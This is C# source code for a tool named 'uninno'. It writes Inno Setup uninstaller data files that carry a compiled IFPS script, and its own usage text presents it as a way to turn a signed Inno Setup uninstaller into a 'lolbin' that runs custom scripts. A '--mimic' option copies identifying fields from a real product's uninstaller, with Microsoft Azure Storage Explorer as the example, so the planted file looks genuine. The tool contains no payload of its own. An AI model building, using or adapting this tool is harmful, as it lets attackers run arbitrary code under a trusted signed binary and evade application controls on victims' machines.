using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace uninno
{
    internal class Program
    {
        private static void Usage()
        {
            Console.WriteLine("Usage: {0} compiledcode uninsdat --version <version>", Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
            Console.WriteLine();
            Console.WriteLine("uninno: Inno Setup Uninstaller Configuration Creator.");
            Console.WriteLine("Creates an Inno Setup uninstaller configuration containing a compiled IFPS script.");
            Console.WriteLine("This can be used with a signed Inno Setup uninstaller as a lolbin to execute custom scripts.");
            Console.WriteLine();
            Console.WriteLine("Additional arguments:");
            Console.WriteLine("--platform 32|64 - Sets the uninstaller configuration platform (32-bit or 64-bit)");
            Console.WriteLine("--appid <appid> - Sets the AppID in the configuration file");
            Console.WriteLine("--appname <appname> - Sets the AppName in the configuration file");
            Console.WriteLine("--fileversion <version> - File version number to use (default is 48). For a Unicode Inno Setup you might want to pass 1048.");
            Console.WriteLine("--version <version> - [REQUIRED] Inno Setup version number, postfixed with 'u' for unicode: for example, 6.2.1u");
            Console.WriteLine("--mimic <path> - Path to an Inno Setup uninstaller configuration to read the previous five arguments from");
            Console.WriteLine("Example: --platform 32 --appid {8E14ADF3-1B18-4711-87BD-E3827D395466} --appname \"Microsoft Azure Storage Explorer\" --fileversion 1048 --version 6.0.5u");
            Console.WriteLine("Example: --mimic=\"%localappdata%\\Programs\\Microsoft Azure Storage Explorer\\unins000.dat\"");
            Console.WriteLine();
        }
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }

            Dictionary<string, string> OptionalArgs = new Dictionary<string, string>();
            int requiredArgsIndex = 0;
            int optionalArgsIndex = 0;
            if (args.Length > 2)
            {
                var optionalAtStart = args[0].StartsWith("--");
                if (!optionalAtStart && !args[2].StartsWith("--"))
                {
                    Usage();
                    return;
                }
                if (optionalAtStart)
                {
                    for (int i = 0; i < args.Length; i++)
                    {
                        if (!args[i].StartsWith("--"))
                        {
                            requiredArgsIndex = i;
                            break;
                        }
                        if (i > args.Length - 3)
                        {
                            Usage();
                            return;
                        }
                    }
                } else
                {
                    optionalArgsIndex = 2;
                }
                var optionalArgsEnd = args.Length;
                if (requiredArgsIndex > optionalArgsIndex) optionalArgsEnd = optionalArgsIndex;
                for (int i = optionalArgsIndex; i < optionalArgsEnd; i++)
                {
                    var arg = args[i].Substring(2);
                    switch (arg.ToLower())
                    {
                        case "platform":
                        case "appid":
                        case "appname":
                        case "fileversion":
                        case "version":
                        case "mimic":
                            OptionalArgs[arg] = args[i + 1];
                            i++;
                            break;
                        default:
                            Usage();
                            return;
                    }
                }
            }

            var header = new LogHeader();
            uint ExtraData = 0;
            bool IsUnicode = false;
            if (OptionalArgs.TryGetValue("mimic", out var mimic))
            {
                LogHeader mimicHeader;
                try
                {
                    using (var fs = File.OpenRead(mimic))
                    {
                        mimicHeader = LogHeader.LoadForMimic(fs);
                        var body = LogFile.ReadBody(fs);
                        using (var bodyReader = new BinaryReader(body, Encoding.UTF8, true))
                        {
                            while (body.Position < body.Length)
                            {
                                var type = bodyReader.Read<RecordType>();
                                var extra = bodyReader.Read<uint>();
                                var len = bodyReader.Read<uint>();
                                if (type != RecordType.CompiledCode)
                                {
                                    body.Position += len;
                                    continue;
                                }
                                ExtraData = extra;
                                IsUnicode = (extra & 0x80000000) != 0;
                                break;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error when loading {0}: {1}", mimic, ex);
                    Usage();
                    return;
                }
                header.Is64Bit = mimicHeader.Is64Bit;
                header.AppId = mimicHeader.AppId;
                header.AppName = mimicHeader.AppName;
                header.Unmanaged.Version = mimicHeader.Unmanaged.Version;
            }
            else
            {
                if (OptionalArgs.TryGetValue("platform", out var platform))
                {
                    header.Is64Bit = platform == "64";
                    if (platform != "32" && !header.Is64Bit)
                    {
                        Usage();
                        return;
                    }
                }

                header.AppId = header.AppName = "";
                if (!OptionalArgs.TryGetValue("appid", out header.AppId)) header.AppId = "";
                if (!OptionalArgs.TryGetValue("appname", out header.AppName)) header.AppName = "";
                if (OptionalArgs.TryGetValue("fileversion", out var verString))
                {
                    if (int.TryParse(verString, out var version)) header.Unmanaged.Version = version;
                }
                if (OptionalArgs.TryGetValue("version", out verString))
                {
                    var versionSplit = verString.Split('.');
                    if (!uint.TryParse(versionSplit[0], out var one) || !uint.TryParse(versionSplit[1], out var two)) {
                        Usage();
                        return;
                    }
                    if (versionSplit[2].EndsWith("u"))
                    {
                        IsUnicode = true;
                        versionSplit[2] = versionSplit[2].Substring(0, versionSplit[2].Length - 1);
                    }
                    if (!uint.TryParse(versionSplit[2], out var three))
                    {
                        Usage();
                        return;
                    }
                    ExtraData = (one << 24) | (two << 16) | (three << 8) | (IsUnicode ? 0x80000000u : 0);
                }
                else
                {
                    Usage();
                    return;
                }
            }


            var file = new LogFile();
            file.Header = header;
            var ms = new MemoryStream();
            {
                // first: script
                ms.WriteByte(0xfe);
                var data = File.ReadAllBytes(args[requiredArgsIndex]);
                var dataLen = data.Length;

                // If Unicode Inno Setup, then the script length needs to be divisible by sizeof(char).
                bool needsExtraByte = IsUnicode && (dataLen & 1) != 0;
                if (needsExtraByte) dataLen++;

                ms.Write(BitConverter.GetBytes(dataLen * (IsUnicode ? -1 : 1)), 0, sizeof(int));
                ms.Write(data, 0, data.Length);
                if (needsExtraByte) ms.WriteByte(0);

                // second: leadbytes, size = 0x20
                ms.WriteByte(0x20);
                ms.Position += 0x20;

                // 2-5: can be len=0
                ms.WriteByte(0);
                ms.WriteByte(0);
                ms.WriteByte(0);
                ms.WriteByte(0);

                // 6: len=4, uint array count=0
                ms.WriteByte(4);
                ms.WriteByte(0);
                ms.WriteByte(0);
                ms.WriteByte(0);
                ms.WriteByte(0);
            }
            file.Records.Add(new Record(RecordType.CompiledCode, ms.ToArray(), ExtraData));
            ms = new MemoryStream();
            var bw = new BinaryWriter(ms, Encoding.UTF8, true);
            file.Save(bw);
            ms.Position = 0;
            using (var fs = File.OpenWrite(args[requiredArgsIndex + 1]))
                ms.CopyTo(fs);

            Console.WriteLine("Saved binary to {0}", args[requiredArgsIndex + 1]);
        }
    }
}
